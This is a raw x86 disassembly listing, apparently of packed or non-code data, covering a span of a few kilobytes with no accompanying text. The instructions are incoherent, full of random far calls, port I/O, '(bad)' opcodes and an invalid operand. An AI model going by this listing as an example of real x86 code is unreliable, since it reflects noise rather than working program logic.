  439127:	xchg   DWORD PTR [ecx],edi
  439129:	call   0x9dd6:0xe385
  43912f:	mov    WORD PTR [edi],ds
  439131:	or     ebx,eax
  439133:	cwde   
  439134:	stos   BYTE PTR es:[edi],al
  439135:	mov    ds:0xd253ed2e,eax
  43913a:	call   0xffdf:0xedc5fe36
  439141:	repz dec ebp
  439143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439144:	sbb    dh,dl
  439146:	mov    dh,dh
  439148:	fstp   DWORD PTR [ebp+ecx*4+0xf22b2c6]
  43914f:	inc    edx
  439150:	call   0x4979:0x1519de31
  439157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439158:	adc    DWORD PTR [edx-0x44cabe21],0xea754f07
  439162:	call   0xb8c6:0xfc5b3467
  439169:	sbb    DWORD PTR [ecx-0x580b7459],ebp
  43916f:	push   eax
  439170:	popf   
  439171:	and    ecx,DWORD PTR [ecx]
  439173:	pop    ecx
  439174:	mov    dl,0x1f
  439176:	mov    esp,0xf90d8755
  43917b:	push   edi
  43917c:	push   cs
  43917d:	or     ecx,eax
  43917f:	inc    edi
  439180:	xchg   esi,eax
  439181:	ret    
  439182:	sub    ebp,eax
  439184:	and    DWORD PTR [edi-0xd37d967],0xffffffec
  43918b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43918c:	ja     0x439199
  43918e:	ror    bh,cl
  439190:	xor    esi,esp
  439192:	retf   
  439193:	xchg   ecx,eax
  439194:	mov    eax,0x3fab9af4
  439199:	call   0x35f00ff7
  43919e:	shl    BYTE PTR [edi-0x3089d311],0x2a
  4391a5:	jo     0x4391c9
  4391a7:	fcmovb st,st(0)
  4391a9:	aam    0x9a
  4391ab:	mov    WORD PTR [ebx],cs
  4391ad:	cs mov dl,0x52
  4391b0:	dec    ebx
  4391b1:	mov    esi,0x44ada7ec
  4391b6:	xchg   DWORD PTR [ebx-0x184795c2],ebp
  4391bc:	leave  
  4391bd:	cwde   
  4391be:	call   0x831d:0x3e6b62a8
  4391c5:	inc    edx
  4391c6:	pop    edx
  4391c7:	mov    DWORD PTR [esi+0x7c],ebx
  4391ca:	jae    0x439173
  4391cc:	jp     0x43923f
  4391ce:	(bad)  
  4391cf:	and    dl,ah
  4391d1:	adc    eax,0xacb9e09a
  4391d6:	arpl   WORD PTR [edx-0x58d546d7],cx
  4391dc:	or     ah,bh
  4391de:	sub    DWORD PTR [ecx+0x31bf96da],0xffffffb2
  4391e5:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4391e7:	imul   esi,DWORD PTR [eax-0x1e],0xfffffff9
  4391eb:	jns    0x43926a
  4391ed:	or     edx,edx
  4391ef:	ror    ecx,1
  4391f1:	rol    esp,1
  4391f3:	into   
  4391f4:	dec    esp
  4391f5:	pushf  
  4391f6:	call   0xf999:0x85cda6be
  4391fd:	(bad)  
  4391fe:	and    al,0x99
  439200:	cli    
  439201:	in     eax,0x9b
  439203:	or     esi,DWORD PTR [esi-0x5ceed2b6]
  439209:	jnp    0x439227
  43920b:	cmp    BYTE PTR [edx+0x6291e768],dh
  439211:	push   0xffffff84
  439213:	stos   BYTE PTR es:[edi],al
  439214:	ins    DWORD PTR es:[edi],dx
  439215:	or     al,0xa2
  439217:	dec    edi
  439218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439219:	push   ebx
  43921a:	loopne 0x43922a
  43921c:	ss bnd jmp 0x32fc908a
  439223:	sbb    ebp,eax
  439225:	dec    ecx
  439226:	call   0xc7e6:0x31464f00
  43922d:	cmp    ebp,esi
  43922f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439230:	jmp    0xa973:0x4afe08c0
  439237:	jecxz  0x4391df
  439239:	pop    eax
  43923a:	int3   
  43923b:	scas   al,BYTE PTR es:[edi]
  43923c:	pop    ecx
  43923d:	xor    esi,edi
  43923f:	daa    
  439240:	xchg   ebx,eax
  439241:	xor    BYTE PTR [ecx+0x3dc8dcaa],al
  439247:	mov    al,ds:0xfb7c962a
  43924c:	jmp    0x4c7081fc
  439251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439252:	in     eax,0x57
  439254:	mov    dl,0xf9
  439256:	add    al,0xc
  439258:	ins    BYTE PTR es:[edi],dx
  439259:	mov    ebp,0xbeea5d6
  43925e:	pusha  
  43925f:	pop    ss
  439260:	fs aaa 
  439262:	fs and dl,al
  439265:	mov    esp,0x9339e99a
  43926a:	lods   al,BYTE PTR ds:[esi]
  43926b:	sbb    ebx,edi
  43926d:	in     eax,0xfd
  43926f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439270:	ins    BYTE PTR es:[edi],dx
  439271:	(bad)  
  439272:	xchg   esp,eax
  439273:	add    eax,0x20c7df8d
  439278:	mov    dl,0x73
  43927a:	(bad)
  43927e:	jbe    0x4392cf
  439280:	imul   ecx
  439282:	xlat   BYTE PTR ds:[ebx]
  439283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439284:	dec    ebp
  439285:	mov    DWORD PTR [edx+0xc70f518],ebp
  43928b:	ins    DWORD PTR es:[edi],dx
  43928c:	mov    dl,0x38
  43928e:	mov    edi,DWORD PTR [ecx]
  439290:	sbb    BYTE PTR [ecx],ah
  439292:	adc    DWORD PTR [ebp+0x34ce0014],0x39a0852
  43929c:	inc    al
  43929e:	out    dx,eax
  43929f:	cmp    dh,BYTE PTR [edx-0x67a37c21]
  4392a5:	mov    bh,0xe4
  4392a7:	mov    bh,0xfc
  4392a9:	pop    ss
  4392aa:	jbe    0x43923f
  4392ac:	sub    BYTE PTR [eax-0x3c],cl
  4392af:	push   edx
  4392b0:	and    ebp,esi
  4392b2:	jp     0x439240
  4392b4:	sbb    esi,DWORD PTR ds:0x5af6fc9f
  4392ba:	push   ds
  4392bb:	les    esi,FWORD PTR [edx]
  4392bd:	cwde   
  4392be:	pop    edi
  4392bf:	and    BYTE PTR [ecx+0x2f],cl
  4392c2:	jmp    0x544ee8f5
  4392c7:	dec    ecx
  4392c8:	add    bh,BYTE PTR [edi+esi*4+0x7e03b2fa]
  4392cf:	and    DWORD PTR [esi+0x30],ecx
  4392d2:	out    dx,eax
  4392d3:	pop    edi
  4392d4:	add    BYTE PTR [ebx],cl
  4392d6:	popf   
  4392d7:	add    al,0x71
  4392d9:	mov    DWORD PTR [esi-0x3c],ebx
  4392dc:	mov    ss,WORD PTR [esi]
  4392de:	call   0x3977:0xbf118a97
  4392e5:	push   eax
  4392e6:	xor    eax,0x5d2055a7
  4392eb:	cs out 0xe1,eax
  4392ee:	xor    dl,bh
  4392f0:	scas   eax,DWORD PTR es:[edi]
  4392f1:	lods   al,BYTE PTR ds:[esi]
  4392f2:	inc    ecx
  4392f3:	ret    0x69f2
  4392f6:	ss jmp 0x785a:0xa79d5a86
  4392fe:	arpl   WORD PTR [esi-0x7308827f],ax
  439304:	push   eax
  439305:	das    
  439306:	call   0x2e64:0x487957bf
  43930d:	xchg   edx,eax
  43930e:	jecxz  0x4392c9
  439310:	aaa    
  439311:	lahf   
  439312:	push   ds
  439313:	mov    DWORD PTR [bx+di],ebx
  439316:	mov    bh,0x84
  439318:	int    0x59
  43931a:	call   0x3fcb:0xde98e4a
  439321:	mov    bl,0xc6
  439323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439324:	ret    0x85ef
  439327:	cli    
  439328:	int3   
  439329:	sub    ebp,esp
  43932b:	xchg   ebx,eax
  43932c:	mov    dl,0x78
  43932e:	mov    esi,0x68b56548
  439333:	(bad)  
  439334:	jecxz  0x439371
  439336:	add    al,0xa8
  439338:	jbe    0x439399
  43933a:	(bad)  
  43933b:	or     al,0xbd
  43933d:	test   BYTE PTR [edi],dh
  43933f:	cmp    al,cl
  439341:	mov    ebp,DWORD PTR [edi-0x44058b54]
  439347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439348:	sahf   
  439349:	mov    bl,0xcf
  43934b:	stc    
  43934c:	(bad)  
  43934e:	cmp    ecx,DWORD PTR [edx+esi*4-0x35bb7131]
  439355:	lock inc eax
  439357:	and    esp,DWORD PTR [ebx+ecx*1-0x4114b26b]
  43935e:	into   
  43935f:	enter  0x6e8c,0xa1
  439363:	scas   al,BYTE PTR es:[edi]
  439364:	jg     0x439372
  439366:	mov    ds:0x4aabe12f,al
  43936b:	mov    al,0x77
  43936d:	call   0xb1df390b
  439372:	or     eax,0x7a8c5538
  439377:	or     ecx,ecx
  439379:	in     eax,dx
  43937a:	cwde   
  43937b:	fmul   st,st(0)
  43937d:	not    DWORD PTR [eax-0x1]
  439380:	lods   eax,DWORD PTR ds:[esi]
  439381:	imul   ebp,esp,0xffffffc6
  439384:	xchg   ebx,eax
  439385:	out    dx,eax
  439386:	mov    ecx,0xd65c57a7
  43938b:	(bad)  
  43938c:	xor    DWORD PTR [esp+edx*2],edi
  43938f:	mov    esi,0x93dde894
  439394:	mov    WORD PTR [ebx],cs
  439396:	enter  0x3ae4,0x0
  43939a:	pop    ecx
  43939b:	add    edx,DWORD PTR [ebp+0xb]
  43939e:	cmc    
  43939f:	mov    edx,0x1c72befd
  4393a4:	push   ds
  4393a5:	(bad)  
  4393a6:	xchg   esi,eax
  4393a7:	sbb    DWORD PTR [eax+0x1f],esp
  4393aa:	mov    dl,0xd
  4393ac:	(bad)  [ebx]
  4393ae:	rcl    ebp,cl
  4393b0:	sub    DWORD PTR [esi+0x6e],esi
  4393b3:	std    
  4393b4:	jae    0x4393f7
  4393b6:	call   0xd4f:0x2b856a71
  4393bd:	sbb    bl,BYTE PTR [eax-0x7d]
  4393c0:	jne    0x4393c8
  4393c2:	fbld   TBYTE PTR [edi+0x145c3adb]
  4393c8:	pop    ss
  4393c9:	push   eax
  4393ca:	call   0x91fa:0x7e7a289f
  4393d1:	retf   0xa78b
  4393d4:	dec    edx
  4393d5:	test   BYTE PTR [ecx-0x178eb9ac],ch
  4393db:	stc    
  4393dc:	mov    bl,0xbc
  4393de:	test   cl,0x6b
  4393e1:	adc    BYTE PTR [eax+0x2f],dl
  4393e4:	xor    al,BYTE PTR [edi]
  4393e6:	pop    ebp
  4393e7:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4393e9:	mov    cl,0x5b
  4393eb:	cmp    DWORD PTR [edx-0x6c3eeeb7],esi
  4393f1:	lods   eax,DWORD PTR ds:[esi]
  4393f2:	xchg   edx,eax
  4393f3:	imul   BYTE PTR [ebp+0x27]
  4393f6:	push   edx
  4393f7:	cmp    dh,BYTE PTR [edi-0x60d1e5cc]
  4393fd:	mov    al,ds:0x12918f32
  439402:	call   0x7b3c:0x9d931847
  439409:	pop    edi
  43940a:	push   edi
  43940b:	mov    ch,0x26
  43940d:	jno    0x4393e6
  43940f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439410:	stos   DWORD PTR es:[edi],eax
  439411:	fdivr  DWORD PTR [edi+ecx*2+0x7e]
  439415:	cmp    bl,BYTE PTR [edx-0x7f0015fb]
  43941b:	dec    ebp
  43941c:	xor    edx,DWORD PTR [esi+0x32]
  43941f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439420:	jge    0x4393bb
  439422:	daa    
  439423:	cs adc al,0x4b
  439426:	adc    al,0xb
  439428:	mov    dl,0xd6
  43942a:	pop    ecx
  43942b:	imul   al
  43942d:	push   edi
  43942e:	add    edi,edi
  439430:	sbb    cl,BYTE PTR [ebx]
  439432:	mov    DWORD PTR [edx-0x43226e95],esp
  439438:	and    esi,DWORD PTR [edi]
  43943a:	popf   
  43943b:	xor    bh,bl
  43943d:	gs dec ecx
  43943f:	xchg   esi,eax
  439440:	inc    edx
  439441:	mov    BYTE PTR [esi+0x66],dl
  439444:	jne    0x439450
  439446:	outs   dx,DWORD PTR ds:[esi]
  439447:	stos   DWORD PTR es:[edi],eax
  439448:	in     al,dx
  439449:	sub    al,0xd1
  43944b:	dec    edx
  43944c:	mov    edx,0xb2aa07c3
  439451:	pop    esi
  439452:	ret    0xca2d
  439455:	pusha  
  439456:	sub    dl,dl
  439458:	push   esp
  439459:	or     ebp,DWORD PTR [edx+0x10]
  43945c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43945d:	adc    DWORD PTR [eax-0x656c8331],0x5
  439464:	add    DWORD PTR [eax+0x531c8ed8],eax
  43946a:	sbb    BYTE PTR [esi+0x761acdd4],bl
  439470:	pop    edi
  439471:	out    dx,al
  439472:	repz sahf 
  439474:	sub    BYTE PTR [ecx-0x66],dl
  439477:	push   edi
  439478:	addr16 jl 0x439419
  43947b:	pop    ebp
  43947c:	(bad)
  439481:	das    
  439482:	test   BYTE PTR ds:0x28d5a520,dl
  439488:	mov    dl,0x64
  43948a:	sbb    al,0x32
  43948d:	xchg   ebx,eax
  43948e:	dec    eax
  43948f:	ins    BYTE PTR es:[edi],dx
  439490:	fmul   QWORD PTR [eax]
  439492:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439493:	sub    eax,DWORD PTR [ebp+0x0]
  439496:	imul   edi,DWORD PTR [ebx],0xa3bffb1a
  43949c:	lods   al,BYTE PTR ds:[esi]
  43949d:	cmp    al,0x7a
  43949f:	les    esi,FWORD PTR [edx]
  4394a1:	in     eax,0x52
  4394a3:	sub    eax,0xa7148ed2
  4394a8:	pusha  
  4394a9:	mov    edx,0x33c93cce
  4394ae:	mov    WORD PTR [ebp-0x43],ss
  4394b1:	scas   al,BYTE PTR es:[edi]
  4394b2:	inc    ecx
  4394b3:	add    esi,edi
  4394b5:	dec    ebx
  4394b6:	adc    bh,BYTE PTR [ecx-0x5a113566]
  4394bc:	and    eax,0x9685d077
  4394c1:	lea    ebx,[ecx]
  4394c3:	add    al,0x44
  4394c5:	pop    ss
  4394c6:	or     dh,BYTE PTR [edx]
  4394c8:	add    DWORD PTR [edx+ebx*4],esi
  4394cb:	add    ecx,ebx
  4394cd:	rol    BYTE PTR [esi-0x11],1
  4394d0:	scas   eax,DWORD PTR es:[edi]
  4394d1:	pop    esi
  4394d2:	and    DWORD PTR [edi+0x75cc09f2],0x4c3dfc66
  4394dc:	mov    bl,0x17
  4394de:	jmp    0x75ddea29
  4394e3:	data16 jp 0x43946e
  4394e6:	mov    al,ds:0xd67fcda7
  4394eb:	ds push edi
  4394ed:	jne    0x43949c
  4394ef:	xchg   edi,eax
  4394f0:	ret    0x9aed
  4394f3:	or     eax,DWORD PTR [ebx+0x6c]
  4394f6:	sbb    al,0xf0
  4394f8:	mov    ecx,0xeba7f343
  4394fd:	jmp    0xf76e921
  439502:	cwde   
  439503:	ret    
  439504:	iret   
  439505:	xor    BYTE PTR [edx+0x4dccfc97],bl
  43950b:	xchg   DWORD PTR [edi+0x5ea78141],esp
  439511:	das    
  439512:	xchg   ecx,eax
  439513:	sub    ebp,DWORD PTR [ecx]
  439515:	vandps ymm3,ymm1,YMMWORD PTR [esi+0x1d]
  43951a:	popf   
  43951b:	mov    ebx,0x8729a3b4
  439520:	mov    dl,0x53
  439522:	cmp    eax,0xa60c0231
  439527:	cdq    
  439528:	jnp    0x439560
  43952a:	cmp    dh,BYTE PTR [edi-0x41]
  43952d:	or     bl,BYTE PTR [eax]
  43952f:	xchg   BYTE PTR [edx-0x38a97e1e],dh
  439535:	add    eax,0x16a1be42
  43953a:	ins    DWORD PTR es:[edi],dx
  43953b:	pop    eax
  43953c:	loop   0x4394c9
  43953e:	je     0x439535
  439540:	jmp    0x43950e
  439542:	mov    bl,0x2
  439544:	lods   eax,DWORD PTR ds:[esi]
  439545:	cmp    ch,BYTE PTR [esi-0x567f4d7e]
  43954b:	cdq    
  43954c:	leave  
  43954d:	ffree  st(7)
  43954f:	mov    al,0x87
  439551:	add    ah,BYTE PTR gs:[edi-0x7e11046f]
  439558:	sub    BYTE PTR [eax-0x74bfd05d],0x2a
  43955f:	push   edx
  439560:	cmp    al,0xe8
  439562:	arpl   WORD PTR [eax-0x2a],bp
  439565:	or     DWORD PTR [edi],eax
  439567:	or     DWORD PTR [ecx],ebp
  439569:	or     al,0x2e
  43956b:	addr16 rol bh,1
  43956e:	fcmovu st,st(7)
  439570:	mov    ds:0xc5209d64,eax
  439575:	sub    eax,0xdbf1d82a
  43957a:	dec    ebx
  43957b:	jno    0x439561
  43957d:	or     edi,DWORD PTR [esi-0x666e1361]
  439583:	inc    ecx
  439584:	addr16 test al,0x9b
  439587:	or     DWORD PTR gs:[ebp+0x726d3f03],esp
  43958e:	push   edx
  43958f:	shl    dh,0x8
  439592:	dec    ecx
  439593:	dec    eax
  439594:	push   edi
  439595:	sub    eax,0x4159fc56
  43959a:	arpl   ax,bx
  43959c:	mov    bh,0xe7
  43959e:	mov    dl,0x7c
  4395a0:	ror    al,0x9a
  4395a3:	dec    edi
  4395a4:	pop    esp
  4395a5:	cwde   
  4395a6:	push   ebx
  4395a7:	nop
  4395a8:	xchg   ebx,eax
  4395a9:	stos   DWORD PTR es:[edi],eax
  4395aa:	adc    eax,0x9a06af9a
  4395af:	aad    0x24
  4395b1:	add    bh,cl
  4395b3:	sahf   
  4395b4:	pop    es
  4395b5:	neg    BYTE PTR [edx-0x738e3957]
  4395bb:	call   0xe080:0xa7f4c7ce
  4395c2:	dec    esp
  4395c3:	sub    cl,dh
  4395c5:	rcl    DWORD PTR [ebx-0x26],0x8c
  4395c9:	jb     0x439577
  4395cb:	sbb    BYTE PTR [ecx-0x75],cl
  4395ce:	or     DWORD PTR [ebp-0x6f],esi
  4395d1:	mov    ah,0x60
  4395d3:	sbb    al,0xa9
  4395d5:	or     esi,DWORD PTR [edx+ecx*8-0x678534ba]
  4395dc:	daa    
  4395dd:	rcr    DWORD PTR [edx-0x5315ab97],1
  4395e3:	pop    edx
  4395e4:	add    dl,ah
  4395e6:	cld    
  4395e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4395e8:	or     al,0xbb
  4395ea:	adc    esp,DWORD PTR [edx]
  4395ec:	loop   0x439645
  4395ee:	or     eax,0x9deeb55b
  4395f3:	jmp    0x439662
  4395f5:	mov    esi,0x5d4295c4
  4395fa:	push   ss
  4395fb:	pop    esp
  4395fc:	adc    al,0x15
  4395fe:	jns    0x4395ed
  439600:	ins    BYTE PTR es:[edi],dx
  439601:	mov    ah,0x19
  439603:	jg     0x439657
  439605:	fisttp QWORD PTR ds:0xfa2110d2
  43960b:	jle    0x4395ca
  43960d:	ins    DWORD PTR es:[edi],dx
  43960e:	call   0x63dc:0x3a07d14c
  439615:	fdiv   DWORD PTR [ebx-0x46da1e5c]
  43961b:	lock cwde 
  43961d:	popf   
  43961e:	jno    0x439623
  439620:	xor    ah,BYTE PTR [edx+ecx*2+0x1a]
  439624:	mov    dl,0xe8
  439626:	and    DWORD PTR [eax],0x82bbea5
  43962c:	push   ds
  43962d:	or     ebx,DWORD PTR [ebx+eax*2]
  439630:	gs pop ebx
  439632:	or     DWORD PTR [eax+0x71],ebp
  439635:	add    BYTE PTR [esi+0x1a2fb4c2],al
  43963b:	ss push ss
  43963d:	push   edi
  43963e:	xor    esp,DWORD PTR [eax]
  439640:	xor    cl,BYTE PTR [esp+edi*8]
  439643:	mov    ebx,0x3705a0f6
  439648:	(bad)  [esp+eax*8+0x7e]
  43964c:	mov    esp,0xb9b623fd
  439651:	jmp    0x4396ac
  439653:	or     bl,dh
  439655:	xchg   ebp,eax
  439656:	hlt    
  439657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439658:	mov    esi,0x6559fb5d
  43965d:	ja     0x439624
  43965f:	xchg   DWORD PTR [edx-0x20856d92],esi
  439665:	nop
  439666:	mov    ecx,0x440ae0da
  43966b:	test   DWORD PTR [edx+0x42],esi
  43966e:	jo     0x439682
  439670:	pop    esi
  439671:	out    dx,eax
  439672:	or     eax,0x4509b256
  439677:	retf   
  439678:	outs   dx,BYTE PTR ds:[esi]
  439679:	mov    ecx,0x4e152cc
  43967e:	cld    
  43967f:	add    ebp,DWORD PTR [eax]
  439681:	arpl   WORD PTR [edx+0x8],bx
  439684:	add    al,0xd2
  439686:	and    eax,DWORD PTR [esi+eax*8-0x1ce56591]
  43968d:	jae    0x4396f1
  43968f:	mov    edi,0xa3a159f1
  439694:	ffree  st(7)
  439696:	lahf   
  439697:	adc    BYTE PTR [esi],ch
  439699:	retf   
  43969a:	mov    ebp,0x997a4bac
  43969f:	adc    eax,0x4636cbc2
  4396a4:	or     eax,0x6ee72acb
  4396a9:	add    eax,0xcad0aa77
  4396ae:	mov    edx,0x45d5bd98
  4396b3:	adc    BYTE PTR [edx+0x23edfad9],dh
  4396b9:	in     eax,dx
  4396ba:	mov    ch,0x16
  4396bc:	out    0xb,eax
  4396be:	jle    0x4396c8
  4396c0:	(bad)  
  4396c1:	or     dl,BYTE PTR [eax]
  4396c3:	dec    edx
  4396c4:	iret   
  4396c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4396c6:	call   0x70dd:0x8d2fc76
  4396cd:	mov    dl,0x69
  4396cf:	fdiv   DWORD PTR [ebx+0xb]
  4396d2:	mov    edi,0xcaec4e97
  4396d7:	lods   eax,DWORD PTR ds:[esi]
  4396d8:	and    cl,BYTE PTR [edx+0x72]
  4396db:	cmp    dh,BYTE PTR [edx+0x3a1ef9da]
  4396e1:	jl     0x43968f
  4396e3:	xlat   BYTE PTR ds:[ebx]
  4396e4:	sub    cl,BYTE PTR [ebx]
  4396e6:	push   ebp
  4396e7:	dec    esp
  4396e8:	stos   DWORD PTR es:[edi],eax
  4396e9:	lods   eax,DWORD PTR es:[esi]
  4396eb:	jo     0x4396c5
  4396ed:	lea    esp,cs:[esi]
  4396f0:	pop    esi
  4396f1:	adc    ebx,DWORD PTR [edx+0x198d3515]
  4396f7:	xor    eax,0x8e0d0a5a
  4396fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4396fd:	ret    0x49ed
  439700:	push   ds
  439701:	repz test eax,0xfe58b074
  439707:	pop    ss
  439708:	sub    ecx,DWORD PTR [ecx-0x2a]
  43970b:	cli    
  43970c:	jno    0x4396e6
  43970e:	sbb    eax,0xf57ca127
  439713:	sbb    dh,BYTE PTR [edx-0x79b3ffbc]
  439719:	pop    eax
  43971a:	xchg   ecx,eax
  43971b:	xchg   ebp,eax
  43971c:	xor    al,0xb
  43971e:	(bad)  
  439720:	sbb    bl,BYTE PTR [ecx-0x4b]
  439723:	fs fwait
  439725:	aad    0x9a
  439727:	outs   dx,DWORD PTR ds:[esi]
  439728:	(bad)  
  439729:	repnz repnz sbb al,0x66
  43972d:	push   eax
  43972e:	frstor [edi+0x7ee24529]
  439734:	outs   dx,DWORD PTR ds:[esi]
  439735:	sub    BYTE PTR [bp-0x49],0xd
  43973a:	sahf   
  43973b:	je     0x439730
  43973d:	pop    ecx
  43973e:	sbb    bh,cl
  439740:	stos   BYTE PTR es:[edi],al
  439741:	test   dl,ch
  439743:	pop    ebx
  439744:	dec    esi
  439745:	or     edi,DWORD PTR [edi-0x2f7732cc]
  43974b:	xor    ebp,DWORD PTR [ecx]
  43974d:	stos   DWORD PTR es:[edi],eax
  43974e:	xchg   ebp,eax
  43974f:	mov    ch,al
  439751:	pop    ds
  439752:	jb     0x4396e9
  439754:	mov    dl,0xc4
  439756:	repz hlt 
  439758:	pop    esi
  439759:	dec    eax
  43975a:	imul   eax,DWORD PTR [ecx-0x5888834f],0xa
  439761:	cld    
  439762:	xchg   ebx,eax
  439763:	push   edi
  439764:	xor    esp,DWORD PTR [edi]
  439766:	mov    esi,eax
  439768:	mov    ds:0x45c984d,al
  43976d:	ror    BYTE PTR [edi-0x7a7c28b9],1
  439773:	aad    0xc8
  439775:	or     edi,ebp
  439777:	xchg   edx,eax
  439778:	jo     0x439783
  43977a:	scas   al,BYTE PTR es:[edi]
  43977b:	sbb    ecx,DWORD PTR ds:0xa5109a99
  439781:	fwait
  439782:	mov    esi,0xa43431a6
  439787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439788:	inc    edx
  439789:	int3   
  43978a:	sub    al,0x96
  43978c:	adc    dh,BYTE PTR [ebp+0x7b206fe]
  439792:	push   edi
  439793:	push   ebp
  439794:	out    0x9d,al
  439796:	xchg   esp,eax
  439797:	pop    ebx
  439798:	mov    edi,0xf6536b0b
  43979d:	mov    dl,0x2d
  43979f:	(bad)  
  4397a0:	fs xor ebp,ecx
  4397a3:	or     al,0xb3
  4397a5:	(bad)  
  4397a6:	jle    0x4397f2
  4397a8:	mov    ecx,0x626cbee0
  4397ad:	stos   DWORD PTR es:[edi],eax
  4397ae:	lea    esp,[edi-0x24707e09]
  4397b4:	(bad)  [ebx+0x4c]
  4397b7:	mov    ah,0xb1
  4397b9:	pop    ds
  4397ba:	cwde   
  4397bb:	mov    bh,0xc6
  4397bd:	or     cl,BYTE PTR [esi+0x7]
  4397c0:	add    DWORD PTR [eax-0x4d0f479e],edx
  4397c6:	sub    al,0x67
  4397c8:	pop    esi
  4397c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4397ca:	add    DWORD PTR [edi+0x316e0c19],0xffffffb5
  4397d1:	sbb    al,0xe4
  4397d3:	arpl   ax,bp
  4397d5:	fs pop edx
  4397d7:	push   eax
  4397d8:	fs test al,0x30
  4397db:	pop    edi
  4397dc:	mov    esi,0x1dbd3b0b
  4397e1:	cs adc al,0x88
  4397e4:	pushf  
  4397e5:	lds    ebx,FWORD PTR [ebp-0x6fe514e3]
  4397eb:	div    DWORD PTR [eax+0x5f]
  4397ee:	sbb    DWORD PTR [edi-0x4],esp
  4397f1:	imul   ebx,esi,0xebe083a0
  4397f7:	mov    edi,0x371cfbad
  4397fc:	pop    ebp
  4397fd:	rcr    DWORD PTR [edx+0x1729f235],1
  439803:	inc    edi
  439804:	ins    DWORD PTR es:[edi],dx
  439805:	jecxz  0x43979a
  439807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439808:	mov    gs,WORD PTR [edi+0x70c05ec]
  43980e:	test   al,0x65
  439810:	mov    dl,0x67
  439812:	mov    esp,0x73947a06
  439817:	or     edx,DWORD PTR [ebp+0x7112440b]
  43981d:	bound  edx,QWORD PTR [eax*2+0x439a1a39]
  439824:	jne    0x43982e
  439826:	mov    dh,0x27
  439828:	dec    ebp
  439829:	ret    0xac7f
  43982c:	lock push 0xffffffe2
  43982f:	jl     0x439816
  439831:	mov    edi,esp
  439833:	es xchg esp,eax
  439835:	mov    bl,0x90
  439837:	mov    ecx,0x277387bc
  43983c:	push   edx
  43983d:	add    al,0x30
  43983f:	jae    0x439815
  439841:	xchg   BYTE PTR es:[edi-0x1a],bl
  439845:	call   0xcecdeda4
  43984a:	div    cl
  43984c:	xchg   ecx,eax
  43984d:	or     esp,DWORD PTR [esi-0x1af3c4ff]
  439853:	sahf   
  439854:	neg    BYTE PTR [ebx+0x3806d69b]
  43985a:	mov    ah,BYTE PTR [ebp+0x6520040]
  439860:	mov    bl,0x79
  439862:	aaa    
  439863:	cdq    
  439864:	pushf  
  439865:	shl    DWORD PTR [edi],1
  439867:	sbb    dh,BYTE PTR ds:0x2a7cbd76
  43986d:	mov    ebx,0x679e30ab
  439872:	call   0x1998:0x7e2b00e3
  439879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43987a:	pop    ecx
  43987b:	mov    ch,0xe8
  43987d:	jns    0x439877
  43987f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439880:	mov    cl,0x11
  439882:	xchg   esi,eax
  439883:	daa    
  439884:	outs   dx,DWORD PTR ds:[esi]
  439885:	popa   
  439886:	call   0x512e:0xa6277e66
  43988d:	xchg   edi,eax
  43988e:	data16 mov al,ds:0x99b0cf63
  439894:	sbb    DWORD PTR [ecx+0x62520342],0xffffff89
  43989b:	jge    0x43986f
  43989d:	mov    ebp,DWORD PTR [edx-0x7d]
  4398a0:	fisubr DWORD PTR [ebx+0x5d39fbba]
  4398a6:	call   0xb36d:0xa9c006ff
  4398ad:	inc    eax
  4398ae:	jl     0x4398b8
  4398b0:	mov    dl,0x68
  4398b2:	add    BYTE PTR [edi+0x61],cl
  4398b5:	gs mov ah,0x10
  4398b8:	icebp  
  4398b9:	push   cs
  4398ba:	ficom  WORD PTR [ecx]
  4398bc:	mov    edi,0xaf6724f2
  4398c1:	loope  0x4398d7
  4398c3:	std    
  4398c4:	mov    dl,0xc0
  4398c6:	pushf  
  4398c7:	pushf  
  4398c8:	aas    
  4398c9:	aaa    
  4398ca:	push   ss
  4398cb:	and    edi,DWORD PTR [ebx-0x3ebc0cf8]
  4398d1:	push   0x4d5a5ab9
  4398d6:	pop    esp
  4398d7:	mov    ?,WORD PTR [edx-0x11f47c50]
  4398dd:	mov    edi,0xe60b1b6e
  4398e3:	retf   0x768e
  4398e6:	inc    ebx
  4398e7:	mov    al,0x8c
  4398e9:	iret   
  4398ea:	je     0x43994a
  4398ec:	mov    dl,0x5e
  4398ee:	outs   dx,BYTE PTR ds:[esi]
  4398ef:	inc    esp
  4398f0:	int    0xe6
  4398f2:	sti    
  4398f3:	add    eax,0x23c40b8d
  4398f8:	xor    esp,esi
  4398fa:	dec    ebp
  4398fb:	pop    ds
  4398fc:	push   esi
  4398fd:	pop    ebx
  4398fe:	cdq    
  4398ff:	mov    fs,WORD PTR [esi+0x18]
  439902:	call   0x80d6fa84
  439907:	dec    edi
  439908:	test   BYTE PTR [ebx],cl
  43990a:	jbe    0x439897
  43990c:	pop    edi
  43990d:	inc    ebp
  43990e:	jmp    0x9a9a5c02
  439913:	mov    esi,0x532b64dc
  439918:	je     0x439936
  43991a:	xchg   DWORD PTR [edi+0x2eb0bb91],esp
  439920:	pop    ecx
